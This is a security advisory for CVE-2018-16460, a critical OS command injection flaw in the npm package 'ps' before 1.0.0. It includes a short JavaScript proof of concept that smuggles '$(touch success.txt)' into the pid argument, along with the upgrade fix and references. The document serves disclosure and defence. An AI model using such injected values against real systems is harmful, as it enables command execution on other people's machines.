# [C] ps Enables OS Command Injection

## Summary
Severity: Critical
Advisory: GHSA-cfhg-9x44-78h2
CVE: CVE-2018-16460
CWE: CWE-77, CWE-78
Ecosystem: npm
CVSS: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2018-09-17
Source: https://github.com/advisories/GHSA-cfhg-9x44-78h2
Type: github-advisory

## Affected
- npm: `ps` — affected >=0 <1.0.0

## Details
Versions of `ps` before 1.0.0 are vulnerable to command injection.

### Proof of concept:
```js
var ps = require('ps');

ps.lookup({ pid: "$(touch success.txt)" }, function(err, proc) { // this method is vulnerable to command injection
    if (err) {throw err;}
    if (proc) {
        console.log(proc);  // Process name, something like "node" or "bash"
    } else {
        console.log('No such process');
    }
});

// Result: The file success.txt will exist on the filesystem if the touch command was executed
```


## Recommendation

Update to version 1.0.0 or later.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2018-16460
- https://hackerone.com/reports/390848
- https://github.com/advisories/GHSA-cfhg-9x44-78h2
- https://github.com/nodejs/security-wg/blob/master/vuln/npm/470.json
- https://www.npmjs.com/advisories/728
